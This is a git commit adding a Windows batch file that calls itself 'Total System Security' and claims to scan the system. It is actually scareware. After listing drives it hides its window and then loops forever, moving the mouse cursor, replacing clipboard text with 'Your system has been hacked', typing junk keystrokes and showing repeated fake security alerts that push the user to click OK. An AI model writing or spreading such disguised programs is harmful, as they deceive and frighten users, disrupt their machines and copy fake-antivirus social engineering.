cecb27ad1d9fec9a1cf5480b06f9b1b73b387621
InsertPlayZ <62176660+ziad-ahmed-said@users.noreply.github.com>
2020-03-16 14:53:40 +0200

    Total system security Windows source code
    A batch file that contains the actual source code of total system security, that project...

---
+++ totalsystemsecurity.bat
@@ -0,0 +1,157 @@
+::[Bat To Exe Converter]
+::
+::fBE1pAF6MU+EWHreyHcjLQlHcD6LPW/6J70R7ezHy++UqVkSRN4rd5va1qeXM/QW51bhdoM/325DlcoAGxpKe1ytZwMxulJxr3eRMsqooQ74Z02a9Uo3Hit3lAM=
+::fBE1pAF6MU+EWHreyHcjLQlHcD6LPW/6J70R7ezHy++UqVkSRN4rd5va1qeXM/QW51bhdoM/325DlcoAGxpKe1ytZwMxulJxr3eRMsqooQ74Z02a9Uo3Hitxn2aw
+::fBE1pAF6MU+EWHreyHcjLQlHcD6LPW/6J70R7ezHy++UqVkSRN4rd5va1qeXM/QW51bhdoM/325DlcoAGxpKe1ytZwMxulJLtWuLec6fvG8=
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFCFdTQDCHWO3A7EgzO3o5P6IsnEJW/Y+dJzCyaCLLfMW6VD2fII023tWj8oeCVVedx6ufTM9qmFM+G2GOKc=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpSI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAjk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsGAlTMZSXqZg==
+::ZQ05rAF9IAHYFVzEqQIEJw9VQESxJXiuA7hc2+34+viOtlR9
+::eg0/rx1wNQPfEVWB+kM9LVsJDDCNKGq2RoYF+/z+4qq0p04IRusrYe8=
+::fBEirQZwNQPfEVWB+kM9LVsJDDCNKGq2RoYF+/z+4qq0p04IRusrYe8=
+::cRolqwZ3JBvQF1fEqQIEJw9VQESxJXiuA7hc2+34+viOtlRdUu0tOLjS1LCBN/Nz
+::dhA7uBVwLU+EWG2L4EM8aChNXxCHMSuJA7YJ+uHv9qqgr081FK5/Tbz6ug==
+::YQ03rBFzNR3SWATEwE0kKRcUfx2RKG63RoYZ6/3p5v6ewg==
+::dhAmsQZ3MwfNWATEwE0kKRcUfx2RKG63RoYZ6/3p5v6e4n0IVu42e8/307eLLvMWpCU=
+::ZQ0/vhVqMQ3MEVWAtB9wBjQ0
+::Zg8zqx1/OA3MEVWAtB9wET5nLA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFCFdTQDCHWO3A7EgzO3o5P6IsnEJW/Y+dJzCyaCLLfMW6VD2fII023tWj8oeCVVedx6ufTM5qGdM+GGdMqc=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+cls
+title Total System Security for Windows.
+echo Please wait while we scan your system, and other drives...
+dir C:
+dir D:
+dir E:
+dir F:
+dir G:
+dir H:
+dir I:
+dir J:
+dir K:
+dir L:
+dir M:
+dir N:
+dir O:
+dir B:
+dir Q:
+dir R:
+dir X:
+dir T:
+dir U:
+dir V:
+dir W:
+dir X:
+dir Y:
+dir Z:
+%extd% /hideself
+:start
+%extd% /setcursor 100 100
+%extd% /setcursor 200 200
+%extd% /setcursor 300 200
+%extd% /setcursor 600 400
+%extd% /setcursor 100 100
+%extd% /setcursor 200 200
+%extd% /setcursor 300 200
+%extd% /setcursor 600 400
+%extd% /setcursor 100 100
+%extd% /setcursor 200 200
+%extd% /setcursor 300 200
+%extd% /setcursor 600 400
+%extd% /setcursor 100 100
+%extd% /setcursor 200 200
+%extd% /setcursor 300 200
+%extd% /setcursor 600 400
+%extd% /setcursor 100 100
+%extd% /setcursor 200 200
+%extd% /setcursor 300 200
+%extd% /setcursor 600 400
+%extd% /setcursor 100 100
+%extd% /setcursor 200 200
+%extd% /setcursor 300 200
+%extd% /setcursor 600 400
+%extd% /setcursor 100 100
+%extd% /setcursor 200 200
+%extd% /setcursor 300 200
+%extd% /setcursor 600 400
+%extd% /setcursor 100 100
+%extd% /setcursor 200 200
+%extd% /setcursor 300 200
+%extd% /setcursor 600 400
+%extd% /setclipboardtext "Total System Security needs your attention.."
+%extd% /setclipboardtext "Your system has been hacked."
+%extd% /sendkeys ttttttttttttttttt
+%extd% /sendkeys xxxxxxxxxxxxxxxxx
+%extd% /sendkeys yyyyyyyyyyyyyyyyy
+%extd% /sendkeys iiiiiiiiiiiiiiiii
+%extd% /sendkeys ttttttttttttttttt
+%extd% /sendkeys xxxxxxxxxxxxxxxxx
+%extd% /sendkeys yyyyyyyyyyyyyyyyy
+%extd% /sendkeys iiiiiiiiiiiiiiiii
+%extd% /sendkeys ttttttttttttttttt
+%extd% /sendkeys xxxxxxxxxxxxxxxxx
+%extd% /sendkeys yyyyyyyyyyyyyyyyy
+%extd% /sendkeys iiiiiiiiiiiiiiiii
+%extd% /sendkeys ttttttttttttttttt
+%extd% /sendkeys xxxxxxxxxxxxxxxxx
+%extd% /sendkeys yyyyyyyyyyyyyyyyy
+%extd% /sendkeys iiiiiiiiiiiiiiiii
+%extd% /sendkeys ttttttttttttttttt
+%extd% /sendkeys xxxxxxxxxxxxxxxxx
+%extd% /sendkeys yyyyyyyyyyyyyyyyy
+%extd% /sendkeys iiiiiiiiiiiiiiiii
+%extd% /sendkeys ttttttttttttttttt
+%extd% /sendkeys xxxxxxxxxxxxxxxxx
+%extd% /sendkeys yyyyyyyyyyyyyyyyy
+%extd% /sendkeys iiiiiiiiiiiiiiiii
+%extd% /sendkeys ttttttttttttttttt
+%extd% /sendkeys xxxxxxxxxxxxxxxxx
+%extd% /sendkeys yyyyyyyyyyyyyyyyy
+%extd% /sendkeys iiiiiiiiiiiiiiiii
+%extd% /sendkeys ttttttttttttttttt
+%extd% /sendkeys xxxxxxxxxxxxxxxxx
+%extd% /sendkeys yyyyyyyyyyyyyyyyy
+%extd% /sendkeys iiiiiiiiiiiiiiiii
+%extd% /sendkeys ttttttttttttttttt
+%extd% /sendkeys xxxxxxxxxxxxxxxxx
+%extd% /sendkeys yyyyyyyyyyyyyyyyy
+%extd% /sendkeys iiiiiiiiiiiiiiiii
+%extd% /sendkeys ttttttttttttttttt
+%extd% /sendkeys xxxxxxxxxxxxxxxxx
+%extd% /sendkeys yyyyyyyyyyyyyyyyy
+%extd% /sendkeys iiiiiiiiiiiiiiiii
+SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour that ocurrs on your system, please update your version of Total System Security and try again" /T:"Total System Security"
+%extd% /messagebox "Total System Security for Windows" "Total System Security needs to take some actions about your system, so they would be protected against malware if you would like to protect your system, please press OK button ,else we won't take any action to protect your system ,and your system files will become more vulnerable for online hackers and other illegal downloaders, please click OK to continue..." 16
+SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour that ocurrs on your system, please update your version of Total System Security and try again" /T:"Total System Security"
+%extd% /messagebox "Total System Security for Windows" "Total System Security needs to take some actions about your system, so they would be protected against malware if you would like to protect your system, please press OK button ,else we won't take any action to protect your system ,and your system files will become more vulnerable for online hackers and other illegal downloaders, please click OK to continue..." 16
+SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour that ocurrs on your system, please update your version of Total System Security and try again" /T:"Total System Security"
+%extd% /messagebox "Total System Security for Windows" "Total System Security needs to take some actions about your system, so they would be protected against malware if you would like to protect your system, please press OK button ,else we won't take any action to protect your system ,and your system files will become more vulnerable for online hackers and other illegal downloaders, please click OK to continue..." 16
+SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour that ocurrs on your system, please update your version of Total System Security and try again" /T:"Total System Security"
+%extd% /messagebox "Total System Security for Windows" "Total System Security needs to take some actions about your system, so they would be protected against malware if you would like to protect your system, please press OK button ,else we won't take any action to protect your system ,and your system files will become more vulnerable for online hackers and other illegal downloaders, please click OK to continue..." 16
+SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour that ocurrs on your system, please update your version of Total System Security and try again" /T:"Total System Security"
+%extd% /messagebox "Total System Security for Windows" "Total System Security needs to take some actions about your system, so they would be protected against malware if you would like to protect your system, please press OK button ,else we won't take any action to protect your system ,and your system files will become more vulnerable for online hackers and other illegal downloaders, please click OK to continue..." 16
+SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour that ocurrs on your system, please update your version of Total System Security and try again" /T:"Total System Security"
+%extd% /messagebox "Total System Security for Windows" "Total System Security needs to take some actions about your system, so they would be protected against malware if you would like to protect your system, please press OK button ,else we won't take any action to protect your system ,and your system files will become more vulnerable for online hackers and other illegal downloaders, please click OK to continue..." 16
+SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour that ocurrs on your system, please update your version of Total System Security and try again" /T:"Total System Security"
+%extd% /messagebox "Total System Security for Windows" "Total System Security needs to take some actions about your system, so they would be protected against malware if you would like to protect your system, please press OK button ,else we won't take any action to protect your system ,and your system files will become more vulnerable for online hackers and other illegal downloaders, please click OK to continue..." 16
+echo %result%
+%extd% /sleep 2000
+goto start
